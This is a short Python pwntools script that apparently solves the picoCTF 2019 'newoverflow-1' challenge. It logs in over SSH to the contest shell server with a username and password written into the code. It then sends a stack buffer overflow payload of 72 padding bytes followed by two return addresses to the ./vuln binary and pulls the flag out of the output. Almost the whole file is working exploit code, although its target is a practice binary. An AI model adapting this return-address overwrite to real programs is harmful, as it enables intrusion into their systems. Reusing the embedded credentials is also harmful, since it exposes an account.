from pwn import *
#check the stactk pointer in gdb x/x $rsp
#return     400851
#flag      400767


from pwn import *
import re

try:
    session = ssh(host='2019shell1.picoctf.com', user='cse331', password='3curityishard', level=50)
    session.set_working_directory("/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a".encode("utf-8"))
    p = session.run("python -c \"import pwn; print(\'A\'*72 + pwn.p64(0x00400851) + pwn.p64(0x00400767))\" | ./vuln")
    recvl = p.recvall()

    flag = re.search(r"picoCTF{(.*)}", str(recvl))
    print(flag.groups()[0])
    p.close()
except:
    print('lost connection to server')
